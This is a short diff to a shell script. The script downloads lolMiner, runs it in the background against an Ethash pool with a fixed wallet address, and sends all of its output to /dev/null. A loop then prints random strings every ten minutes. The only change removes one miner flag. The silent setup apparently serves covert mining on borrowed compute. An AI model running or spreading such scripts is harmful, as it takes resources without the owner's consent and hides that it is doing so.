@@ -1,5 +1,5 @@
 wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.51a/lolMiner_v1.51a_Lin64.tar.gz
 tar xf lolMiner_v1.51a_Lin64.tar.gz
 cd 1.51a
-./lolMiner --algo ETHASH --pool us.ethash.k1pool.com:5000 --user KrGPWBVcvUveerjbyiUjRXtTfhBhJXkDtng.$(echo $(shuf -i 1-20000 -n 1)-aing) --pass 123 --ethstratum ETHPROXY --enablezilcache --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
+./lolMiner --algo ETHASH --pool us.ethash.k1pool.com:5000 --user KrGPWBVcvUveerjbyiUjRXtTfhBhJXkDtng.$(echo $(shuf -i 1-20000 -n 1)-aing) --pass 123 --ethstratum ETHPROXY --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
